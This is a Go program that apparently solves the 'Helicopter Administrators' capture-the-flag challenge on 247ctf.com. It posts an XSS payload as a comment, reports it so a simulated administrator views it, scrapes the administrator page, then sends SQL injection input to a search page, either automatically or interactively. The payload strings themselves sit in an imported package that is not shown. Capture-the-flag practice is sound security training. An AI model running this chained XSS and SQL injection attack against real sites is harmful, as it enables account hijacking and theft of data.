package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"strings"

	"../../xss"
)

var (
	interactive bool = false
)

func main() {
	flag.BoolVar(&interactive, "interactive", false, "[+] Interactive to manual SQL injection!")
	flag.Parse()

	fmt.Println("[+] Advanced XSS Challenge at 247ctf.com - HELICOPTER ADMINISTRATORS")
	//1-SEND THE PAYLOAD TO COMMENT USER 1 /POST
	//http.post()
	x := xss.New()

	fmt.Println("[+] Cleaning stuff..")
	x.ClearComment(1)
	x.ClearComment(2)

	//Send payload
	fmt.Println("[+] Sending XSS Payload..")
	x.XSSVector()

	//Let the admin visit the page
	fmt.Println("[+] Reporting the comment - Go Admin!..")
	x.ClearComment(1)

	//Lets read the comment user 2
	fmt.Println("[+] Parsing the HTML Page ..")
	x.GetAdminPage()

	/////Sending for search
	fmt.Println("[+] Sending Search data ..")
	if interactive {
		for {
			input := readInput()
			x.DoSearch(input)

			x.ClearComment(1)
			x.ClearComment(2)

			//Parse Search Page - User/3
			fmt.Println(x.GetSearchPage())
		}
	}
	x.DoSearch(x.GetSqliPayload())

	x.ClearComment(1)
	x.ClearComment(2)

	//Parse Search Page - User/3
	fmt.Println(x.GetSearchPage())

}

func readInput() string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("#-> ")
	text, _ := reader.ReadString('\n')
	return strings.Split(text, "\n")[0]
}

//https://247ctf.com/dashboard
//CHALLENGE NAME: HELICOPTER ADMINISTRATORS
//This applications administrators are very aggressive. They will immediately view any page you report. Can you trick them into disclosing data they shouldn't?
